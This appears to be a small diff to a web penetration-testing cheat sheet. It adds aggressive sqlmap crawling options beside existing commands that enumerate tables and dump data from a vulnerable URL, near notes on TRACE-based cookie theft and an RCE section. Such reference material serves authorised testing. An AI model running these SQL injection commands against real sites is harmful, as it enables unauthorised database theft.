@@ -169,6 +169,7 @@ If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a
  > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
                   --tables (to see db)
                   -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
+                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
 ```
 
 **RCE**
